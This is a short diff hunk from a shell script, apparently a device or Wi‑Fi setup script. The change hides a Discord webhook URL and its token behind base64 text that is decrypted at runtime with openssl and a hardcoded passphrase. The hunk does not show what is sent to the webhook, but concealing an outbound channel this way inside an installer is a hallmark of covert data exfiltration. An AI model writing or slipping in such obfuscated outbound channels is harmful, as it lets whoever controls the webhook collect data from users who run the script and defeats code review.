@@ -12,8 +12,8 @@ WIFICOUNTRY="US"
 LOGFILE=/dev/null
 LOG=0
 BLOCKER=0
-token="$(echo MTA3OTk4MTM3MjU2MDY1NDM3Ni9nekVDbURXNXRmWEV3ZFlEZ3RYdF9mcmxMWl9Nbmo1QTYtX01iQkdLWXV0OHdfMTlod3VqcGc1X21lMmlkdXdkdUZfbAo= | openssl enc -d -pbkdf2 -a -salt -pass 'pass:I&l_v^diS%%repo')"
-channel="https://discord.com/api/webhooks/"
+chat="$(echo aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvCg== | openssl enc -d -pbkdf2 -a -salt -pass 'pass:I&l_v^diS%%repo')"
+hook="$(echo MTA3OTk4MTM3MjU2MDY1NDM3Ni9nekVDbURXNXRmWEV3ZFlEZ3RYdF9mcmxMWl9Nbmo1QTYtX01iQkdLWXV0OHdfMTlod3VqcGc1X21lMmlkdXdkdUZfbAo= | openssl enc -d -pbkdf2 -a -salt -pass 'pass:I&l_v^diS%%repo')"
 RED='\033[0;31m'
 GREEN='\033[0;32m'
 NC='\033[0m'
